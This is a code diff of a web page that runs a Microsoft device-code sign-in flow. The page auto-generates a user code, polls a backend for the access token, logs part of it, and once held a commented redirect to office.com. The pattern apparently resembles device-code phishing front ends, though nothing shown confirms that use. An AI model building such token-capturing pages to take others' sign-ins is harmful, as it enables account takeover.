@@ -5,7 +5,7 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; 
+            font-family: 'Segoe UI', system-ui, sans-serif; 
             background: #0a0e17; 
             display: flex; 
             justify-content: center; 
@@ -83,8 +83,6 @@
         .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
         .btn.secondary { background: #1f2e3f; }
         .btn.secondary:hover { background: #2a3a4e; }
-        .btn.danger { background: #7f1d1d; }
-        .btn.danger:hover { background: #991b1b; }
         .spinner { 
             display: none; 
             text-align: center; 
@@ -130,41 +128,8 @@
         }
         .log-area .entry { padding: 2px 0; border-bottom: 1px solid #0d1520; }
         .log-area .entry:last-child { border-bottom: none; }
-        .manual-section {
-            margin-top: 16px;
-            padding: 16px;
-            background: #0a0e17;
-            border-radius: 10px;
-            border: 1px solid #1a2a3a;
-            display: none;
-        }
-        .manual-section.active { display: block; }
-        .manual-section input {
-            width: 100%;
-            padding: 12px;
-            border-radius: 8px;
-            border: 1px solid #2a3a4e;
-            background: #0a0e17;
-            color: #e0e6ed;
-            font-size: 16px;
-            font-family: monospace;
-            letter-spacing: 2px;
-            text-align: center;
-            margin-bottom: 10px;
-        }
-        .manual-section input:focus { outline: 2px solid #2563eb; border-color: transparent; }
-        .badge {
-            display: inline-block;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: 600;
-            margin-left: 8px;
-        }
-        .badge.pending { background: #f59e0b; color: #000; }
-        .badge.approved { background: #10b981; color: #000; }
-        .badge.expired { background: #ef4444; color: #fff; }
-        .badge.waiting { background: #3b82f6; color: #fff; }
+        .log-area .entry.error { color: #f87171; }
+        .log-area .entry.success { color: #34d399; }
     </style>
 </head>
 <body>
@@ -199,13 +164,7 @@
         <button class="btn" id="checkBtn">🔄 Check Status</button>
         <div class="flex-row">
             <button class="btn secondary" id="copyBtn">📋 Copy Code</button>
-            <button class="btn secondary" id="manualBtn">⌨️ Manual</button>
             <button class="btn secondary" id="refreshBtn">🔄 New Code</button>
-        </div>
-        
-        <div class="manual-section" id="manualSection">
-            <input type="text" id="manualCodeInput" placeholder="Enter code manually" maxlength="12">
-            <button class="btn" id="manualSubmitBtn">🔑 Submit Manual Code</button>
         </div>
         
         <div id="errorDisplay" class="error-text"></div>
@@ -215,7 +174,6 @@
     </div>
 
     <script>
-        // ── CONFIG ──
         const API_BASE = window.location.origin;
         let deviceCode = '';
         let userCode = '';
@@ -223,25 +181,19 @@
         let isPolling = false;
         let flowActive = false;
 
-        // ── DOM REFS ──
         const codeDisplay = document.getElementById('deviceCode');
         const urlDisplay = document.getElementById('deviceUrl');
         const statusEl = document.getElementById('status');
         const spinner = document.getElementById('spinner');
         const checkBtn = document.getElementById('checkBtn');
         const copyBtn = document.getElementById('copyBtn');
-        const manualBtn = document.getElementById('manualBtn');
         const refreshBtn = document.getElementById('refreshBtn');
-        const manualSection = document.getElementById('manualSection');
-        const manualCodeInput = document.getElementById('manualCodeInput');
-        const manualSubmitBtn = document.getElementById('manualSubmitBtn');
         const errorDisplay = document.getElementById('errorDisplay');
         const logArea = document.getElementById('logArea');
 
-        // ── LOGGING ──
         function addLog(msg, type = 'info') {
             const entry = document.createElement('div');
-            entry.className = 'entry';
+            entry.className = `entry ${type}`;
             const time = new Date().toLocaleTimeString();
             const icons = { info: '💡', success: '✅', error: '❌', warning: '⚠️', pending: '⏳' };
             entry.textContent = `[${time}] ${icons[type] || '•'} ${msg}`;
@@ -259,7 +211,6 @@
             if (msg) addLog(`❌ ${msg}`, 'error');
         }
 
-        // ── COPY ──
         async function copyCode() {
             const code = codeDisplay.textContent;
             if (!code || code === '⟳ Generating...' || code === '⚠️ Error') {
@@ -281,26 +232,6 @@
             }
         }
 
-        // ── MANUAL CODE ──
-        manualBtn.addEventListener('click', () => {
-            manualSection.classList.toggle('active');
-            if (manualSection.classList.contains('active')) {
-                manualCodeInput.focus();
-            }
-        });
-
-        manualSubmitBtn.addEventListener('click', async () => {
-            const code = manualCodeInput.value.trim().toUpperCase();
-            if (!code) { setError('Please enter a code'); return; }
-            addLog(`🔑 Manual code submitted: ${code}`, 'info');
-            setStatus(`⏳ Manual code ${code} submitted, waiting for approval...`, 'pending');
-            // We can't poll with manual code since we need device_code, but we can simulate
-            // or just tell the user to use the auto flow
-            setError('Manual code entry is for display only. Use "New Code" to generate a fresh device flow.');
-            manualSection.classList.remove('active');
-        });
-
-        // ── REFRESH (NEW CODE) ──
         refreshBtn.addEventListener('click', () => {
             if (pollInterval) {
                 clearInterval(pollInterval);
@@ -319,7 +250,6 @@
             setTimeout(startDeviceFlow, 300);
         });
 
-        // ── CHECK STATUS ──
         checkBtn.addEventListener('click', () => {
             if (deviceCode) {
                 addLog('🔍 Manual status check...', 'info');
@@ -331,7 +261,6 @@
 
         copyBtn.addEventListener('click', copyCode);
 
-        // ── POLLING LOGIC ──
         async function pollForToken(manual = false) {
             if (!deviceCode || isPolling) return;
             isPolling = true;
@@ -347,7 +276,6 @@
                 console.log('📦 Poll response:', data);
 
                 if (data.access_token) {
-                    // SUCCESS
                     clearInterval(pollInterval);
                     pollInterval = null;
                     flowActive = false;
@@ -358,8 +286,6 @@
                     addLog(`🔑 Access: ${data.access_token.slice(0, 20)}...`, 'success');
                     spinner.classList.remove('active');
                     setError('');
-                    // Optional redirect
-                    // window.location.href = 'https://www.office.com';
                     return;
                 }
 
@@ -402,7 +328,6 @@
             }
         }
 
-        // ── MAIN FLOW ──
         async function startDeviceFlow() {
             if (flowActive) return;
             flowActive = true;
@@ -427,12 +352,11 @@
                 const data = await response.json();
                 console.log('✅ Device code response:', data);
 
-                if (data.error) throw new Error(data.error);
+                if (data.error) throw new Error(data.error_description || data.error);
 
                 deviceCode = data.device_code;
                 userCode = data.user_code;
 
-                // Update UI
                 codeDisplay.textContent = userCode;
                 codeDisplay.className = 'code-display';
                 urlDisplay.textContent = data.verification_uri || 'https://microsoft.com/devicelogin';
@@ -440,16 +364,13 @@
                 addLog(`✅ Code generated: ${userCode}`, 'success');
                 addLog(`🔗 ${data.verification_uri}`, 'info');
 
-                // Start polling
                 if (pollInterval) clearInterval(pollInterval);
                 const intervalMs = (data.interval || 5) * 1000 + 500;
                 pollInterval = setInterval(() => {
                     pollForToken();
                 }, intervalMs);
 
-                // Also poll immediately
                 setTimeout(() => pollForToken(), 1000);
-
                 flowActive = false;
 
             } catch (err) {
@@ -464,26 +385,18 @@
             }
         }
 
-        // ── AUTO-START ──
         window.addEventListener('DOMContentLoaded', () => {
             setTimeout(startDeviceFlow, 500);
         });
 
-        // ── KEYBOARD SHORTCUTS ──
         document.addEventListener('keydown', (e) => {
-            if (e.key === 'c' && (e.ctrlKey || e.metaKey)) {
-                // Let browser handle copy
-            }
             if (e.key === 'r' && !e.ctrlKey && !e.metaKey) {
                 refreshBtn.click();
             }
-            if (e.key === 'Enter' && manualSection.classList.contains('active')) {
-                manualSubmitBtn.click();
-            }
         });
 
-        console.log('🍟♤ Device Code UI v2.0 loaded');
-        console.log('🔑 Shortcuts: [R] New Code, [Ctrl+C] Copy, [Enter] Submit manual');
+        console.log('🍟♤ Device Code UI v3.0 (Mobile Client Fixed)');
+        console.log('🔑 Shortcuts: [R] New Code, [Ctrl+C] Copy');
     </script>
 </body>
 </html>
